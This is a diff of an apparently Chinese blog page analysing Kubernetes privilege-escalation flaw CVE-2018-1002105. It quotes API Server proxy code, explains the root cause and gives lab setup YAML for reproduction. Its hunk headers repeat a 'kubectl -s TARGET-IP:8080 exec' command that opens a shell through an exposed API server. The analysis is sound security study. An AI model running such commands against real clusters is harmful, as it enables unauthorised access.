+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">!</span><span class="nx">httpstream</span><span class="p">.</span><span class="nf">IsUpgradeRequest</span><span class="p">(</span><span class="nx">req</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">glog</span><span class="p">.</span><span class="nf">V</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">Infof</span><span class="p">(</span><span class="s">&#34;Request was not an upgrade&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="kc">false</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>接着，它建立了到后端服务的连接：</p>
 <div class="highlight"><div class="chroma">
@@ -685,21 +685,21 @@ kubectl -s TARGET-IP:8080 <span class="nb">exec</span> -it attacker /bin/bash
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="k">if</span> <span class="nx">h</span><span class="p">.</span><span class="nx">InterceptRedirects</span> <span class="p">{</span>
-	<span class="nx">glog</span><span class="p">.</span><span class="nf">V</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">Infof</span><span class="p">(</span><span class="s">&#34;Connecting to backend proxy (intercepting redirects) %s\n  Headers: %v&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">location</span><span class="p">,</span> <span class="nx">clone</span><span class="p">.</span><span class="nx">Header</span><span class="p">)</span>
-	<span class="nx">backendConn</span><span class="p">,</span> <span class="nx">rawResponse</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">utilnet</span><span class="p">.</span><span class="nf">ConnectWithRedirects</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">Method</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">location</span><span class="p">,</span> <span class="nx">clone</span><span class="p">.</span><span class="nx">Header</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">Body</span><span class="p">,</span> <span class="nx">utilnet</span><span class="p">.</span><span class="nf">DialerFunc</span><span class="p">(</span><span class="nx">h</span><span class="p">.</span><span class="nx">DialForUpgrade</span><span class="p">),</span> <span class="nx">h</span><span class="p">.</span><span class="nx">RequireSameHostRedirects</span><span class="p">)</span>
-<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-	<span class="nx">glog</span><span class="p">.</span><span class="nf">V</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">Infof</span><span class="p">(</span><span class="s">&#34;Connecting to backend proxy (direct dial) %s\n  Headers: %v&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">location</span><span class="p">,</span> <span class="nx">clone</span><span class="p">.</span><span class="nx">Header</span><span class="p">)</span>
-	<span class="nx">clone</span><span class="p">.</span><span class="nx">URL</span> <span class="p">=</span> <span class="o">&amp;</span><span class="nx">location</span>
-	<span class="nx">backendConn</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">h</span><span class="p">.</span><span class="nf">DialForUpgrade</span><span class="p">(</span><span class="nx">clone</span><span class="p">)</span>
-<span class="p">}</span>
-<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
-	<span class="nx">glog</span><span class="p">.</span><span class="nf">V</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">Infof</span><span class="p">(</span><span class="s">&#34;Proxy connection error: %v&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
-	<span class="nx">h</span><span class="p">.</span><span class="nx">Responder</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="nx">req</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
-	<span class="k">return</span> <span class="kc">true</span>
-<span class="p">}</span>
-<span class="k">defer</span> <span class="nx">backendConn</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="k">if</span> <span class="nx">h</span><span class="p">.</span><span class="nx">InterceptRedirects</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">glog</span><span class="p">.</span><span class="nf">V</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">Infof</span><span class="p">(</span><span class="s">&#34;Connecting to backend proxy (intercepting redirects) %s\n  Headers: %v&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">location</span><span class="p">,</span> <span class="nx">clone</span><span class="p">.</span><span class="nx">Header</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">backendConn</span><span class="p">,</span> <span class="nx">rawResponse</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">utilnet</span><span class="p">.</span><span class="nf">ConnectWithRedirects</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">Method</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">location</span><span class="p">,</span> <span class="nx">clone</span><span class="p">.</span><span class="nx">Header</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">Body</span><span class="p">,</span> <span class="nx">utilnet</span><span class="p">.</span><span class="nf">DialerFunc</span><span class="p">(</span><span class="nx">h</span><span class="p">.</span><span class="nx">DialForUpgrade</span><span class="p">),</span> <span class="nx">h</span><span class="p">.</span><span class="nx">RequireSameHostRedirects</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">glog</span><span class="p">.</span><span class="nf">V</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">Infof</span><span class="p">(</span><span class="s">&#34;Connecting to backend proxy (direct dial) %s\n  Headers: %v&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">location</span><span class="p">,</span> <span class="nx">clone</span><span class="p">.</span><span class="nx">Header</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">clone</span><span class="p">.</span><span class="nx">URL</span> <span class="p">=</span> <span class="o">&amp;</span><span class="nx">location</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">backendConn</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">h</span><span class="p">.</span><span class="nf">DialForUpgrade</span><span class="p">(</span><span class="nx">clone</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">glog</span><span class="p">.</span><span class="nf">V</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">Infof</span><span class="p">(</span><span class="s">&#34;Proxy connection error: %v&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">h</span><span class="p">.</span><span class="nx">Responder</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="nx">req</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="kc">true</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">defer</span> <span class="nx">backendConn</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>然后，<code>tryUpgrade</code> 函数进行了 HTTP Hijack 操作，简单来说，就是不再将 HTTP 连接处理委托给 Go 语言内置的处理流程，程序自身在 TCP 连接基础上进行 HTTP 交互，这是从 HTTP 升级到 WebSocket 的关键步骤之一：</p>
 <p><img
@@ -741,24 +741,24 @@ kubectl -s TARGET-IP:8080 <span class="nb">exec</span> -it attacker /bin/bash
 </span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="c1">// Proxy the connection.
-</span><span class="c1"></span><span class="nx">writerComplete</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="kd">struct</span><span class="p">{})</span>
-<span class="nx">readerComplete</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="kd">struct</span><span class="p">{})</span>
-<span class="k">go</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
-  <span class="o">...</span>
-<span class="p">}()</span>
-<span class="k">go</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
-  <span class="o">...</span>
-<span class="p">}()</span>
-<span class="c1">// Wait for one half the connection to exit. Once it does the defer will
-</span><span class="c1">// clean up the other half of the connection.
-</span><span class="c1"></span><span class="k">select</span> <span class="p">{</span>
-	<span class="k">case</span> <span class="o">&lt;-</span><span class="nx">writerComplete</span><span class="p">:</span>
-	<span class="k">case</span> <span class="o">&lt;-</span><span class="nx">readerComplete</span><span class="p">:</span>
-<span class="p">}</span>
-<span class="nx">glog</span><span class="p">.</span><span class="nf">V</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">Infof</span><span class="p">(</span><span class="s">&#34;Disconnecting from backend proxy %s\n  Headers: %v&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">location</span><span class="p">,</span> <span class="nx">clone</span><span class="p">.</span><span class="nx">Header</span><span class="p">)</span>
-<span class="k">return</span> <span class="kc">true</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="c1">// Proxy the connection.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">writerComplete</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="kd">struct</span><span class="p">{})</span>
+</span></span><span class="line"><span class="cl"><span class="nx">readerComplete</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="kd">struct</span><span class="p">{})</span>
+</span></span><span class="line"><span class="cl"><span class="k">go</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">}()</span>
+</span></span><span class="line"><span class="cl"><span class="k">go</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">}()</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Wait for one half the connection to exit. Once it does the defer will
+</span></span></span><span class="line"><span class="cl"><span class="c1">// clean up the other half of the connection.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">select</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">case</span> <span class="o">&lt;-</span><span class="nx">writerComplete</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="k">case</span> <span class="o">&lt;-</span><span class="nx">readerComplete</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">glog</span><span class="p">.</span><span class="nf">V</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">Infof</span><span class="p">(</span><span class="s">&#34;Disconnecting from backend proxy %s\n  Headers: %v&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">location</span><span class="p">,</span> <span class="nx">clone</span><span class="p">.</span><span class="nx">Header</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="kc">true</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>这是 API Server 视角下建立代理的流程。那么，在这个过程中，后端服务又是如何参与的呢？</p>
 <p>以 Kubelet 为例，当用户对某个 Pod 执行 exec 操作时，该请求经过上面 API Server 的代理，发给 Kubelet。 Kubelet 在初始化时会启动一个自己的 API Server（为便于区分，后文所有单独出现的 API Server 均指的是 Kubernetes API Server，用 Kubelet API Server 指代 Kubelet 内部的 API Server)。</p>
@@ -798,12 +798,12 @@ kubectl -s TARGET-IP:8080 <span class="nb">exec</span> -it attacker /bin/bash
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
-		<span class="nx">utilruntime</span><span class="p">.</span><span class="nf">HandleError</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
-		<span class="nx">response</span><span class="p">.</span><span class="nf">WriteError</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusBadRequest</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
-		<span class="k">return</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">utilruntime</span><span class="p">.</span><span class="nf">HandleError</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">response</span><span class="p">.</span><span class="nf">WriteError</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusBadRequest</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>回到上面的第三种情况。结合 <code>API Server</code> 中 <code>tryUpgrade</code> 代码可以发现，<code>API Server</code> 并没有对这种错误情况进行处理，依然通过两个 <code>Goroutine</code> 为客户端到 <code>Kubelet</code> 建立了 <code>Websocket</code> 连接。问题的核心在于，这个连接并没有对接到某个 <code>Pod</code> 上（因为前面 <code>getExec</code> 失败返回了），也没有被销毁，客户端可以继续通过这个连接向 Kubelet 下发指令。由于经过了 <code>API Server</code> 的代理，因此指令是以 <code>API Server</code> 的权限向 <code>Kubelet</code> 下发的。也就是说，客户端自此能够自由向该 <code>Kubelet</code> 下发指令而不受限制，从而实现了权限提升，这就是 <code>CVE-2018-1002105</code> 漏洞的成因。</p>
 <h3 id="33-复现">3.3 复现</h3>
@@ -818,8 +818,8 @@ kubectl -s TARGET-IP:8080 <span class="nb">exec</span> -it attacker /bin/bash
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">./metarget cnv install cve-2018-1002105 --domestic
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./metarget cnv install cve-2018-1002105 --domestic
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>模拟攻击场景：集群中存在一个 vul 的命名空间，其中存在一个运行的业务 Pod。攻击者具有 vul 命名空间下 Pod 的 exec 权限，但是不具有其它高级权限。通过该漏洞进行提权。</p>
 <ul>
@@ -834,12 +834,12 @@ kubectl -s TARGET-IP:8080 <span class="nb">exec</span> -it attacker /bin/bash
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="c"># cve_2018_1002105_namespace.yaml</span><span class="w">
-</span><span class="w"></span><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">v1</span><span class="w">
-</span><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Namespace</span><span class="w">
-</span><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
-</span><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">vul</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="c"># cve_2018_1002105_namespace.yaml</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">v1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Namespace</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">vul</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>创建角色 test，并赋予权限</li>
@@ -871,30 +871,30 @@ kubectl -s TARGET-IP:8080 <span class="nb">exec</span> -it attacker /bin/bash
 </span><span class="lnt">23
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="c"># cve_2018_1002105_role.yaml</span><span class="w">
-</span><span class="w"></span><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">rbac.authorization.k8s.io/v1</span><span class="w">
-</span><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Role</span><span class="w">
-</span><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
-</span><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">test</span><span class="w">
-</span><span class="w">  </span><span class="nt">namespace</span><span class="p">:</span><span class="w"> </span><span class="l">vul</span><span class="w">
-</span><span class="w"></span><span class="nt">rules</span><span class="p">:</span><span class="w">
-</span><span class="w"></span>- <span class="nt">apiGroups</span><span class="p">:</span><span class="w">
-</span><span class="w">  </span>- <span class="s2">&#34;&#34;</span><span class="w">
-</span><span class="w">  </span><span class="nt">resources</span><span class="p">:</span><span class="w">
-</span><span class="w">  </span>- <span class="l">pods</span><span class="w">
-</span><span class="w">  </span><span class="nt">verbs</span><span class="p">:</span><span class="w">
-</span><span class="w">  </span>- <span class="l">get</span><span class="w">
-</span><span class="w">  </span>- <span class="l">list</span><span class="w">
-</span><span class="w">  </span>- <span class="l">delete</span><span class="w">
-</span><span class="w">  </span>- <span class="l">watch</span><span class="w">
-</span><span class="w"></span>- <span class="nt">apiGroups</span><span class="p">:</span><span class="w">
-</span><span class="w">  </span>- <span class="s2">&#34;&#34;</span><span class="w">
-</span><span class="w">  </span><span class="nt">resources</span><span class="p">:</span><span class="w">
-</span><span class="w">  </span>- <span class="l">pods/exec</span><span class="w">
-</span><span class="w">  </span><span class="nt">verbs</span><span class="p">:</span><span class="w">
-</span><span class="w">  </span>- <span class="l">create</span><span class="w">
-</span><span class="w">  </span>- <span class="l">get</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="c"># cve_2018_1002105_role.yaml</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">rbac.authorization.k8s.io/v1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Role</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">test</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">namespace</span><span class="p">:</span><span class="w"> </span><span class="l">vul</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">rules</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span>- <span class="nt">apiGroups</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="s2">&#34;&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">resources</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="l">pods</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">verbs</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="l">get</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="l">list</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="l">delete</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="l">watch</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span>- <span class="nt">apiGroups</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="s2">&#34;&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">resources</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="l">pods/exec</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">verbs</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="l">create</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="l">get</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>创建用户 test，并与角色 test 绑定</li>
@@ -917,21 +917,21 @@ kubectl -s TARGET-IP:8080 <span class="nb">exec</span> -it attacker /bin/bash
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="c"># cve_2018_1002105_role_binding.yaml</span><span class="w">
-</span><span class="w"></span><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">rbac.authorization.k8s.io/v1</span><span class="w">
-</span><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">RoleBinding</span><span class="w">
-</span><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
-</span><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">test</span><span class="w">
-</span><span class="w">  </span><span class="nt">namespace</span><span class="p">:</span><span class="w"> </span><span class="l">vul</span><span class="w">
-</span><span class="w"></span><span class="nt">roleRef</span><span class="p">:</span><span class="w">
-</span><span class="w">  </span><span class="nt">apiGroup</span><span class="p">:</span><span class="w"> </span><span class="l">rbac.authorization.k8s.io</span><span class="w">
-</span><span class="w">  </span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Role</span><span class="w">
-</span><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">test</span><span class="w">
-</span><span class="w"></span><span class="nt">subjects</span><span class="p">:</span><span class="w">
-</span><span class="w"></span>- <span class="nt">apiGroup</span><span class="p">:</span><span class="w"> </span><span class="l">rbac.authorization.k8s.io</span><span class="w">
-</span><span class="w">  </span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Group</span><span class="w">
-</span><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">test</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="c"># cve_2018_1002105_role_binding.yaml</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">rbac.authorization.k8s.io/v1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">RoleBinding</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">test</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">namespace</span><span class="p">:</span><span class="w"> </span><span class="l">vul</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">roleRef</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">apiGroup</span><span class="p">:</span><span class="w"> </span><span class="l">rbac.authorization.k8s.io</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Role</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">test</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">subjects</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span>- <span class="nt">apiGroup</span><span class="p">:</span><span class="w"> </span><span class="l">rbac.authorization.k8s.io</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Group</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">test</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>在命名空间 vul 内创建测试业务 Pod：</li>
@@ -956,23 +956,23 @@ kubectl -s TARGET-IP:8080 <span class="nb">exec</span> -it attacker /bin/bash
 </span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="c"># cve_2018_1002105_pod.yaml</span><span class="w">
-</span><span class="w"></span><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">v1</span><span class="w">
-</span><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Pod</span><span class="w">
-</span><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
-</span><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">test</span><span class="w">
-</span><span class="w">  </span><span class="nt">namespace</span><span class="p">:</span><span class="w"> </span><span class="l">vul</span><span class="w">
-</span><span class="w"></span><span class="nt">spec</span><span class="p">:</span><span class="w">
-</span><span class="w">  </span><span class="nt">containers</span><span class="p">:</span><span class="w">
-</span><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">ubuntu</span><span class="w">
-</span><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l">ubuntu:latest</span><span class="w">
-</span><span class="w">    </span><span class="nt">imagePullPolicy</span><span class="p">:</span><span class="w"> </span><span class="l">IfNotPresent</span><span class="w">
-</span><span class="w">    </span><span class="c"># Just spin &amp; wait forever</span><span class="w">
-</span><span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;/bin/bash&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;-c&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;--&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
-</span><span class="w">    </span><span class="nt">args</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;while true; do sleep 30; done;&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
-</span><span class="w">  </span><span class="nt">serviceAccount</span><span class="p">:</span><span class="w"> </span><span class="l">default</span><span class="w">
-</span><span class="w">  </span><span class="nt">serviceAccountName</span><span class="p">:</span><span class="w"> </span><span class="l">default</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="c"># cve_2018_1002105_pod.yaml</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">v1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">test</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">namespace</span><span class="p">:</span><span class="w"> </span><span class="l">vul</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">spec</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">containers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">ubuntu</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l">ubuntu:latest</span><span class="w">
